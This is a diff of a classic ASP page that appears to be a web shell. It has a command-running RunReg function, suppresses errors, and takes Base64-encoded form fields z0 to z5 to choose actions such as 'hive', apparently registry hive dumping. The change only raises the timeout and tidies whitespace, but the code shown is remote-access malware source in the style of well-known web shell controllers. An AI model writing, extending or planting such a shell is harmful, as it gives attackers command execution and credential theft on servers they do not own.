@@ -1,7 +1,7 @@
 <%
 
 On Error Resume Next
-Server.ScriptTimeout = 900 ' High time limit equivalent
+Server.ScriptTimeout = 9999
 
 Function RunReg(cmd, ByRef output)
     Dim shell, execObj, line, outList
@@ -208,12 +208,12 @@ Response.ContentType = "application/json"
 Response.CharSet = "utf-8"
 
 Dim action, z2, z3, z4, z5
-action  = Base64Decode(Request.Form("z0"))
-z1      = Base64Decode(Request.Form("z1"))
-z2      = Base64Decode(Request.Form("z2"))
-z3      = Base64Decode(Request.Form("z3"))
-z4      = Base64Decode(Request.Form("z4"))
-z5      = Base64Decode(Request.Form("z5"))
+action = Base64Decode(Request.Form("z0"))
+z1 = Base64Decode(Request.Form("z1"))
+z2 = Base64Decode(Request.Form("z2"))
+z3 = Base64Decode(Request.Form("z3"))
+z4 = Base64Decode(Request.Form("z4"))
+z5 = Base64Decode(Request.Form("z5"))
 
 Select Case action
     Case "hive"
